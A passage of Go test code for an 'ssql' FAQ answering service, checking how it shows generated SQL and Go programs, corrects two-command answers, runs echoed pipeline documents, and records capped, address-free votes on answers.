		`ssql generate sql -run -pipeline 'ssql from e.csv | ssql count'`:                  `ssql generate sql -pipeline 'ssql from e.csv | ssql count'`,
		`ssql generate sql -pipeline 'ssql from e.csv | ssql count' | duckdb`:              `ssql generate sql -pipeline 'ssql from e.csv | ssql count'`,
		`ssql from e.csv | ssql count | ssql generate sql | duckdb`:                        `ssql from e.csv | ssql count | ssql generate sql`,
	} {
		if got, lang := shownProgram(in); lang == "" || got != want {
			t.Errorf("%s:\n got  %s (%q)\n want %s", in, got, lang, want)
		}
	}
	for _, in := range []string{
		`ssql generate go -pipeline 'ssql from employees.csv | ssql count'`, // already the program
		`ssql from employees.csv | ssql count`,
		`ssql generate sql -pipeline 'ssql from e.csv | ssql count'`,                 // already the SQL
		`ssql generate sql -pipeline 'ssql from e.csv | ssql count' | duckdb -c 'x'`, // not a bare duckdb: the validator's
		`ssql from e.csv | ssql to csv | duckdb`,                                     // duckdb after no generate sql
	} {
		if got, lang := shownProgram(in); lang != "" || got != in {
			t.Errorf("%s: changed to %s", in, got)
		}
	}
}

// Asked for Go code, the FAQ shows the program: `generate go -run` cannot
// compile in the jail (no network for the toolchain), and the visitor
// wants the code (Ross, 2026-11-22, the first public question came back
// unverified with go's download error). The reply keeps the -run command
// for the visitor's machine, and the review turn leaves a program alone.
func TestAskGeneratedGo(t *testing.T) {
	const cmd = "ssql generate go -run -pipeline 'ssql from employees.csv | ssql where -if dept eq Engineering | ssql group-by city -count n | ssql to table'"
	s, _ := testServer(t, "Yes:\n```bash\n"+cmd+"\n```\n", "```bash\nssql from employees.csv | ssql count\n```")
	s.f.review = true
	w, resp := post(t, s.handler(), askRequest{Question: "Can I turn a pipeline into a Go program?"})
	if w.Code != 200 || resp.Status != "verified" || resp.RanOn != "generated" || resp.Pipeline != cmd {
		t.Fatalf("%d %+v", w.Code, resp)
	}
	if !strings.Contains(resp.Output, "package main") || !strings.Contains(resp.Output, "typed.") || resp.Playground != "" {
		t.Errorf("want the Go program and no playground link: %+v", resp)
	}
}

// Two commands in one block (the Go answer after another question,
// 2026-11-23) get a correction that says so, not a parse error from the
// two joined into one line; the model's one-command answer then runs.
func TestAskTwoCommandsInOneBlock(t *testing.T) {
	two := "Both:\n```bash\n# filter\nssql from employees.csv | ssql where -if age gt 40 | ssql count\n# group\nssql from employees.csv | ssql group-by dept -count n\n```\n"
	one := "```bash\nssql from employees.csv | ssql where -if age gt 40 | ssql count\n```\n"
	s, _ := testServer(t, two, one)
	w, resp := post(t, s.handler(), askRequest{Question: "how many are over 40?"})
	if w.Code != 200 || resp.Status != "verified" {
		t.Fatalf("%d %+v", w.Code, resp)
	}
	var said string
	for _, m := range lastCall {
		said += m.Content
	}
	if !strings.Contains(said, "2 commands") {
		t.Errorf("the correction did not say the block held two commands:\n%s", said)
	}
}

// TestVote: an answer carries an id when the log is kept, a vote on it is
// a log line of its own naming the id and the question (no address), and
// only an id this server gave out can be voted on, a few times at most.
func TestVote(t *testing.T) {
	s, logPath := testServer(t, "Count them:\n```bash\nssql from employees.csv | ssql count\n```\n")
	h := s.handler()
	_, resp := post(t, h, askRequest{Question: "how many employees?"})
	if resp.ID == "" {
		t.Fatalf("no id on the answer: %+v", resp)
	}
	vote := func(id, v string) int {
		b, _ := json.Marshal(voteRequest{ID: id, Vote: v})
		r := newRequest("POST", "/api/vote", bytes.NewReader(b))
		r.RemoteAddr = "192.168.4.20:5555"
		w := httptest.NewRecorder()
		h.ServeHTTP(w, r)
		return w.Code
	}
	if c := vote(resp.ID, "down"); c != 200 {
		t.Fatalf("vote: %d", c)
	}
	if c := vote(resp.ID, "up"); c != 200 { // a change of mind
		t.Fatalf("second vote: %d", c)
	}
	log, _ := os.ReadFile(logPath)
	lines := strings.Split(strings.TrimSpace(string(log)), "\n")
	if len(lines) != 3 || !strings.Contains(lines[0], `"id":"`+resp.ID+`"`) {
		t.Fatalf("log: %s", log)
	}
	var vl voteLine
	if err := json.Unmarshal([]byte(lines[2]), &vl); err != nil || vl.ID != resp.ID || vl.Vote != "up" || vl.Question != "how many employees?" {
		t.Errorf("vote line %q: %+v %v", lines[2], vl, err)
	}
	if strings.Contains(string(log), "192.168") {
		t.Errorf("the log kept the address: %s", log)
	}
	if c := vote("0123456789abcdef", "up"); c != 404 {
		t.Errorf("a vote on an id never given out: %d", c)
	}
	if c := vote(resp.ID, "meh"); c != 400 {
		t.Errorf("a vote that is not up or down: %d", c)
	}
	vote(resp.ID, "up")
	vote(resp.ID, "up")
	if c := vote(resp.ID, "up"); c != 404 {
		t.Errorf("a fifth vote on one answer: %d", c)
	}

	// No log, no id, no votes.
	s2, _ := testServer(t, "Count them:\n```bash\nssql from employees.csv | ssql count\n```\n")
	s2.logPath = ""
	if _, r2 := post(t, s2.handler(), askRequest{Question: "how many employees?"}); r2.ID != "" {
		t.Errorf("an id with no log: %q", r2.ID)
	}
}

// TestAskPipelineDocument: a document echoed into ssql run is verified
// (the docs' own form), with no playground link: the playground has no echo.
func TestAskPipelineDocument(t *testing.T) {
	const pipeline = `ssql run <(echo '[["from","employees.csv"],["where","-if","dept","eq","Engineering"],["count"]]')`
	s, _ := testServer(t, "Yes, as a document:\n```bash\n"+pipeline+"\n```\n")
	w, resp := post(t, s.handler(), askRequest{Question: "can a pipeline be data?"})
	if w.Code != 200 || resp.Status != "verified" || resp.RanOn != "sample" {
		t.Fatalf("%d %+v", w.Code, resp)
	}
	if resp.Playground != "" {
		t.Errorf("a playground link for an echo: %s", resp.Playground)
	}
}
